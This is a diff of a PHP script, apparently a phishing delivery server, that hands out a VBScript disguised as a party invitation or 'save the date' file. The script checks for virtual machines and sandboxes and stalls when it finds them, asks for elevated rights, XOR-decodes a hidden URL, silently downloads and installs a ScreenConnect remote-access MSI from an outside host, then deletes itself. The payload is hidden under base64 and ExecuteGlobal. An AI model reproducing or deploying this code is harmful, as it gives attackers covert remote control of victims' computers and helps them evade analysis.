@@ -1,5 +1,5 @@
 <?php
-// stage1.php - Fixed version (no name redefined error)
+// invite.php - Encoded + VM check + Self-delete after success
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -10,7 +10,7 @@ $baseNames = [
     "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
 ];
 
-$cookieName = "stage1_used";
+$cookieName = "inv_used";
 $used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
 if (!is_array($used)) $used = [];
 
@@ -29,58 +29,98 @@ setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 
 
 header('Content-Disposition: attachment; filename="' . $chosen . '"');
 
-$stage2Url = "https://walrus-app-f8pss.ondigitalocean.app/stage2.php";
+$msiUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";
 
-$xorKey = rand(40, 90);
-$encrypted = "";
-for ($i = 0; $i < strlen($stage2Url); $i++) {
-    $encrypted .= "Chr(" . (ord($stage2Url[$i]) ^ $xorKey) . ")&";
-}
-$encrypted = rtrim($encrypted, "&");
+$key = [];
+$cipher = [];
+$urlLen = strlen($msiUrl);
 
-$junkLines = rand(5, 18);
-$junk = "";
-for ($i = 0; $i < $junkLines; $i++) {
-    $junk .= "' " . bin2hex(random_bytes(rand(4, 12))) . "\r\n";
+for ($i = 0; $i < $urlLen; $i++) {
+    $k = rand(1, 255);
+    $key[] = $k;
+    $cipher[] = ord($msiUrl[$i]) ^ $k;
 }
 
-echo <<<VBS
-' System Helper
-On Error Resume Next
+function formatArray($arr) {
+    $lines = [];
+    $chunks = array_chunk($arr, 10);
+    foreach ($chunks as $chunk) {
+        $hex = array_map(function($v) {
+            return "&H" . strtoupper(str_pad(dechex($v), 2, "0", STR_PAD_LEFT));
+        }, $chunk);
+        $lines[] = "  " . implode(",", $hex);
+    }
+    return implode(", _\r\n", $lines);
+}
 
-Dim score, objShell, objFSO, http, stream, stage2, tempFile, k, svc, item, t, procCount
+$keyFormatted    = formatArray($key);
+$cipherFormatted = formatArray($cipher);
+
+$realVbs = <<<REAL
+Option Explicit
+
+Dim svc, score, objShell, objFSO, msiURL, mefinuwig, harogilim, i
 score = 0
-k = $xorKey
 
-Function C(v, n)
-    Dim x
-    v = LCase(CStr(v))
-    For Each x In n
-        If InStr(v, LCase(CStr(x))) > 0 Then
-            C = True
+On Error Resume Next
+Set svc = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
+If Err.Number <> 0 Then WScript.Quit
+On Error GoTo 0
+
+Sub AddFinding(points)
+    score = score + points
+End Sub
+
+Function ContainsAny(value, needles)
+    Dim needle
+    ContainsAny = False
+    value = LCase(CStr(value))
+    For Each needle In needles
+        If InStr(value, LCase(CStr(needle))) > 0 Then
+            ContainsAny = True
             Exit Function
         End If
     Next
-    C = False
 End Function
 
-Set svc = GetObject("winmgmts:\\\\.\\root\\cimv2")
+Dim item, textValue, count, shell, env, userName, computerName
 
-For Each item In svc.ExecQuery("SELECT Manufacturer,Model FROM Win32_ComputerSystem")
-    t = item.Manufacturer & " " & item.Model
-    If C(t, Array("vmware","virtualbox","virtual machine","kvm","qemu","xen","parallels","hyper-v")) Then score = score + 3
+On Error Resume Next
+
+For Each item In svc.ExecQuery("SELECT Manufacturer, Model FROM Win32_ComputerSystem")
+    textValue = CStr(item.Manufacturer) & " " & CStr(item.Model)
+    If ContainsAny(textValue, Array("vmware", "virtualbox", "virtual machine", "kvm", "qemu", "xen", "parallels", "hyper-v")) Then
+        AddFinding 3
+    End If
 Next
 
-For Each item In svc.ExecQuery("SELECT Manufacturer,SMBIOSBIOSVersion FROM Win32_BIOS")
-    t = item.Manufacturer & " " & item.SMBIOSBIOSVersion
-    If C(t, Array("vmware","virtualbox","vbox","qemu","xen","parallels","hyper-v")) Then score = score + 3
+For Each item In svc.ExecQuery("SELECT Manufacturer, SMBIOSBIOSVersion, SerialNumber FROM Win32_BIOS")
+    textValue = CStr(item.Manufacturer) & " " & CStr(item.SMBIOSBIOSVersion) & " " & CStr(item.SerialNumber)
+    If ContainsAny(textValue, Array("vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "hyper-v")) Then
+        AddFinding 3
+    End If
 Next
 
-procCount = 0
+For Each item In svc.ExecQuery("SELECT Model, Manufacturer FROM Win32_DiskDrive")
+    textValue = CStr(item.Manufacturer) & " " & CStr(item.Model)
+    If ContainsAny(textValue, Array("vmware", "virtual", "vbox", "qemu", "xen")) Then
+        AddFinding 2
+    End If
+Next
+
+count = 0
 For Each item In svc.ExecQuery("SELECT Name FROM Win32_Process")
-    procCount = procCount + 1
+    count = count + 1
 Next
-If procCount < 35 Then score = score + 1
+If count < 35 Then AddFinding 1
+
+Set shell = CreateObject("WScript.Shell")
+Set env = shell.Environment("PROCESS")
+userName = env("USERNAME")
+computerName = env("COMPUTERNAME")
+If ContainsAny(userName & " " & computerName, Array("sandbox", "malware", "analysis", "sample", "test")) Then
+    AddFinding 1
+End If
 
 If score >= 3 Then
     WScript.Sleep 1800000
@@ -90,26 +130,78 @@ End If
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-stage2 = $encrypted
-tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\u" & Int(Rnd*99999) & ".vbs"
+mefinuwig = Array( _
+$keyFormatted )
+harogilim = Array( _
+$cipherFormatted )
+msiURL = ""
+For i = 0 To UBound(harogilim)
+  msiURL = msiURL & Chr(harogilim(i) Xor mefinuwig(i))
+Next
 
-Set http = CreateObject("MSXML2.XMLHTTP")
-http.Open "GET", stage2, False
-http.Send
-
-If http.Status = 200 Then
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1
-    stream.Open
-    stream.Write http.responseBody
-    stream.SaveToFile tempFile, 2
-    stream.Close
-    objShell.Run "wscript.exe """ & tempFile & """", 0, False
+If WScript.Arguments.Length = 0 Then
+    Dim elevShell
+    Set elevShell = CreateObject("Shell.Application")
+    elevShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 0
+    WScript.Quit
 End If
 
+Sub DownloadAndExecute()
+    On Error Resume Next
+    Dim p, http, strm
+    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
+  
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "GET", msiURL, False
+    http.Send
+    If http.Status = 200 Then
+        Set strm = CreateObject("ADODB.Stream")
+        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
+        objShell.Run """" & p & """ /quiet", 0, True
+        WScript.Sleep 90000
+        If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
+    End If
+End Sub
+
+Call DownloadAndExecute
+
+' ===== SELF-DELETE AFTER SUCCESS =====
+On Error Resume Next
 objFSO.DeleteFile WScript.ScriptFullName, True
 
-$junk
 WScript.Quit
-VBS;
+REAL;
+
+$chunkSize = 100;
+$base64 = base64_encode($realVbs);
+$len = strlen($base64);
+$count = ceil($len / $chunkSize);
+
+$vbs = "Option Explicit\r\n";
+$vbs .= "Dim vuliri(" . ($count - 1) . ")\r\n";
+
+for ($i = 0; $i < $count; $i++) {
+    $start = $i * $chunkSize;
+    $chunk = substr($base64, $start, $chunkSize);
+    $vbs .= "vuliri($i) = \"$chunk\"\r\n";
+}
+
+$vbs .= "\r\nDim ojofofi : ojofofi = Join(vuliri, \"\")\r\n";
+$vbs .= "ExecuteGlobal ahokehuho(ojofofi)\r\n\r\n";
+$vbs .= "Function ahokehuho(s)\r\n";
+$vbs .= " Dim cihozot, alemi, nd\r\n";
+$vbs .= " Set cihozot = CreateObject(\"Msxml2.DOMDocument.6.0\")\r\n";
+$vbs .= " Set nd = cihozot.createElement(\"b\")\r\n";
+$vbs .= " nd.dataType = \"bin.base64\"\r\n";
+$vbs .= " nd.text = s\r\n";
+$vbs .= " Set alemi = CreateObject(\"ADODB.Stream\")\r\n";
+$vbs .= " alemi.Type = 1 : alemi.Open\r\n";
+$vbs .= " alemi.Write nd.nodeTypedValue\r\n";
+$vbs .= " alemi.Position = 0\r\n";
+$vbs .= " alemi.Type = 2 : alemi.Charset = \"UTF-8\"\r\n";
+$vbs .= " ahokehuho = alemi.ReadText\r\n";
+$vbs .= " alemi.Close\r\n";
+$vbs .= "End Function\r\n";
+
+echo $vbs;
 ?>
